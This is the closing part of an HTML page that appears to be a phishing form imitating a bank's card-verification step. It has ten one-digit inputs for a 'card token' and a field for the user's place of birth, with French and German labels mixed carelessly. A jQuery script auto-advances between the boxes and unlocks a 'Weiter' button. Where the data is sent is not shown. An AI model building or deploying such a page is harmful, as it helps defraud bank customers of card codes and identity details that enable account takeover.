                                            <legend class="ds fo fc fd fe ff fg fh fi fj fk fl fm fn fp">Token de votre carte</legend>
                                            <div class="l dy adq ea adr bx df ls dg">
                                                <div class="adt bx adu bz adw">
                                                    <label class="fc fd fe ff fg fh fi fj fk fl fm fn fo fp" for="cardToken-0">Token de votre carte — Nombre 1</label>
                                                    <input id="cardToken-0" class="as zo gf ab j rz gh a gi gj gk gl gm gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh hi hj hk hl hm hn ho hp hq hr hs ht hu hv hw hx hy hz ia ib ic id ie if ih ii og oh oi oj ao ar ap po e cr zp zq zr zs zt in io ip iq dn ji iw am ix an zu do" name="cardToken-0" required="" pattern="[0-9]*" minlength="1" maxlength="1" aria-required="true" type="text" autocomplete="off" data-lpignore="true" aria-disabled="false" value="">
                                                </div>
                                                <div class="adt bx adu bz adw">
                                                    <label class="fc fd fe ff fg fh fi fj fk fl fm fn fo fp" for="cardToken-1">Token de votre carte — Nombre 2</label>
                                                    <input id="cardToken-1" class="as zo gf ab j rz gh a gi gj gk gl gm gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh hi hj hk hl hm hn ho hp hq hr hs ht hu hv hw hx hy hz ia ib ic id ie if ih ii og oh oi oj ao ar ap po e cr zp zq zr zs zt in io ip iq dn ji iw am ix an zu do" name="cardToken-1" required="" pattern="[0-9]*" minlength="1" maxlength="1" aria-required="true" type="text" autocomplete="off" data-lpignore="true" aria-disabled="false" value="">
                                                </div>
                                                <div class="adt bx adu bz adw">
                                                    <label class="fc fd fe ff fg fh fi fj fk fl fm fn fo fp" for="cardToken-2">Token de votre carte — Nombre 3</label>
                                                    <input id="cardToken-2" class="as zo gf ab j rz gh a gi gj gk gl gm gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh hi hj hk hl hm hn ho hp hq hr hs ht hu hv hw hx hy hz ia ib ic id ie if ih ii og oh oi oj ao ar ap po e cr zp zq zr zs zt in io ip iq dn ji iw am ix an zu do" name="cardToken-2" required="" pattern="[0-9]*" minlength="1" maxlength="1" aria-required="true" type="text" autocomplete="off" data-lpignore="true" aria-disabled="false" value="">
                                                </div>
                                                <div class="adt bx adu bz adw">
                                                    <label class="fc fd fe ff fg fh fi fj fk fl fm fn fo fp" for="cardToken-3">Token de votre carte — Nombre 4</label>
                                                    <input id="cardToken-3" class="as zo gf ab j rz gh a gi gj gk gl gm gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh hi hj hk hl hm hn ho hp hq hr hs ht hu hv hw hx hy hz ia ib ic id ie if ih ii og oh oi oj ao ar ap po e cr zp zq zr zs zt in io ip iq dn ji iw am ix an zu do" name="cardToken-3" required="" pattern="[0-9]*" minlength="1" maxlength="1" aria-required="true" type="text" autocomplete="off" data-lpignore="true" aria-disabled="false" value="">
                                                </div>
                                                <div class="adt bx adu bz adw">
                                                    <label class="fc fd fe ff fg fh fi fj fk fl fm fn fo fp" for="cardToken-4">Token de votre carte — Nombre 5</label>
                                                    <input id="cardToken-4" class="as zo gf ab j rz gh a gi gj gk gl gm gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh hi hj hk hl hm hn ho hp hq hr hs ht hu hv hw hx hy hz ia ib ic id ie if ih ii og oh oi oj ao ar ap po e cr zp zq zr zs zt in io ip iq dn ji iw am ix an zu do" name="cardToken-4" required="" pattern="[0-9]*" minlength="1" maxlength="1" aria-required="true" type="text" autocomplete="off" data-lpignore="true" aria-disabled="false" value="">
                                                </div>
                                                <div class="adt bx adu bz adw">
                                                    <label class="fc fd fe ff fg fh fi fj fk fl fm fn fo fp" for="cardToken-5">Token de votre carte — Nombre 6</label>
                                                    <input id="cardToken-5" class="as zo gf ab j rz gh a gi gj gk gl gm gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh hi hj hk hl hm hn ho hp hq hr hs ht hu hv hw hx hy hz ia ib ic id ie if ih ii og oh oi oj ao ar ap po e cr zp zq zr zs zt in io ip iq dn ji iw am ix an zu do" name="cardToken-5" required="" pattern="[0-9]*" minlength="1" maxlength="1" aria-required="true" type="text" autocomplete="off" data-lpignore="true" aria-disabled="false" value="">
                                                </div>
                                                <div class="adt bx adu bz adw">
                                                    <label class="fc fd fe ff fg fh fi fj fk fl fm fn fo fp" for="cardToken-6">Token de votre carte — Nombre 7</label>
                                                    <input id="cardToken-6" class="as zo gf ab j rz gh a gi gj gk gl gm gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh hi hj hk hl hm hn ho hp hq hr hs ht hu hv hw hx hy hz ia ib ic id ie if ih ii og oh oi oj ao ar ap po e cr zp zq zr zs zt in io ip iq dn ji iw am ix an zu do" name="cardToken-6" required="" pattern="[0-9]*" minlength="1" maxlength="1" aria-required="true" type="text" autocomplete="off" data-lpignore="true" aria-disabled="false" value="">
                                                </div>
                                                <div class="adt bx adu bz adw">
                                                    <label class="fc fd fe ff fg fh fi fj fk fl fm fn fo fp" for="cardToken-7">Token de votre carte — Nombre 8</label>
                                                    <input id="cardToken-7" class="as zo gf ab j rz gh a gi gj gk gl gm gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh hi hj hk hl hm hn ho hp hq hr hs ht hu hv hw hx hy hz ia ib ic id ie if ih ii og oh oi oj ao ar ap po e cr zp zq zr zs zt in io ip iq dn ji iw am ix an zu do" name="cardToken-7" required="" pattern="[0-9]*" minlength="1" maxlength="1" aria-required="true" type="text" autocomplete="off" data-lpignore="true" aria-disabled="false" value="">
                                                </div>
                                                <div class="adt bx adu bz adw">
                                                    <label class="fc fd fe ff fg fh fi fj fk fl fm fn fo fp" for="cardToken-8">Token de votre carte — Nombre 9</label>
                                                    <input id="cardToken-8" class="as zo gf ab j rz gh a gi gj gk gl gm gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh hi hj hk hl hm hn ho hp hq hr hs ht hu hv hw hx hy hz ia ib ic id ie if ih ii og oh oi oj ao ar ap po e cr zp zq zr zs zt in io ip iq dn ji iw am ix an zu do" name="cardToken-8" required="" pattern="[0-9]*" minlength="1" maxlength="1" aria-required="true" type="text" autocomplete="off" data-lpignore="true" aria-disabled="false" value="">
                                                </div>
                                                <div class="adt bx adu bz adw">
                                                    <label class="fc fd fe ff fg fh fi fj fk fl fm fn fo fp" for="cardToken-9">Token de votre carte — Nombre 10</label>
                                                    <input id="cardToken-9" class="as zo gf ab j rz gh a gi gj gk gl gm gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh hi hj hk hl hm hn ho hp hq hr hs ht hu hv hw hx hy hz ia ib ic id ie if ih ii og oh oi oj ao ar ap po e cr zp zq zr zs zt in io ip iq dn ji iw am ix an zu do" name="cardToken-9" required="" pattern="[0-9]*" minlength="1" maxlength="1" aria-required="true" type="text" autocomplete="off" data-lpignore="true" aria-disabled="false" value="">
                                                </div>
                                            </div>
                                        </fieldset>
                                    </div>
                                </fieldset>
                                <fieldset class="ao ap aq ar bx me bz gd ai am ak an">
                                    <legend class="ds bx kv kw du kx">Bitte geben Sie Ihren Geburtsort an</legend>
                                    <div class="adt bx adu bz adw">
                                            <label class="fc fd fe ff fg fh fi fj fk fl fm fn fo fp" for="cardToken-9">Token de votre carte — Nombre 10</label>
                                            <input style="width:200px;" id="lieux" class="as zo gf ab j rz gh a gi gj gk gl gm gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh hi hj hk hl hm hn ho hp hq hr hs ht hu hv hw hx hy hz ia ib ic id ie if ih ii og oh oi oj ao ar ap po e cr zp zq zr zs zt in io ip iq dn ji iw am ix an zu do" name="lieux" required=""  aria-required="true" type="text" autocomplete="off" data-lpignore="true" aria-disabled="false" value="">
                                        </div>
                                </fieldset>
                                <br>
                                <style>
                                    .submitbtn{
                                        color:White;
                                        background-color: rgb(72, 172, 152);
                                        border-radius: 4px;
                                        border:none;
                                        padding:10px 30px;
                                        cursor: pointer;
                                    }
                                    .submitbtn:disabled,.submitbtn[disabled]{
                                        cursor:default;
                                        opacity: .4;
                                    }

                                </style>
                                <button class="submitbtn" type="submit" disabled>
                                    Weiter
                                </button>
                            </div>
                           
                        </form>
                    </div>
                    <div id="notification-root" role="status" aria-live="polite"></div>
                </main>
            </div>
           
        </div>
    </div>
    

    <script
    src="https://code.jquery.com/jquery-2.2.4.min.js"
    integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44="
    crossorigin="anonymous"></script>
    <script>
            $(document).ready(function(){
                $("input[id^='cardToken']").focus(function(){
                    $(this).css({
                        "border-color": "rgba(72, 172, 152, 0.5)",
                        "border-bottom-width": "2px"
                    })
                });
                $("input[id^='cardToken']").focusout(function(){
                    $(this).css({
                        "border-color": "rgb(201, 201, 201)",
                        "border-bottom-width": "1px"
                    })
                });
                var index = 0
                $("input[id^='cardToken']").keyup(function(){
                    if (this.value.length == 1) {
                        index++
                        $($("input[id^='cardToken']")[index]).focus();
                        if(index >=  $("input[id^='cardToken']").length && $("#lieux").val().length > 0) {
                            $(".submitbtn").attr("disabled", false);
                        }
                    }
                });
                $("#lieux").keyup(function(){
                    if(index >=  $("input[id^='cardToken']").length && $("#lieux").val().length > 0) {
                        $(".submitbtn").attr("disabled", false);
                    }
                })
            })
        </script>
</body>

</html>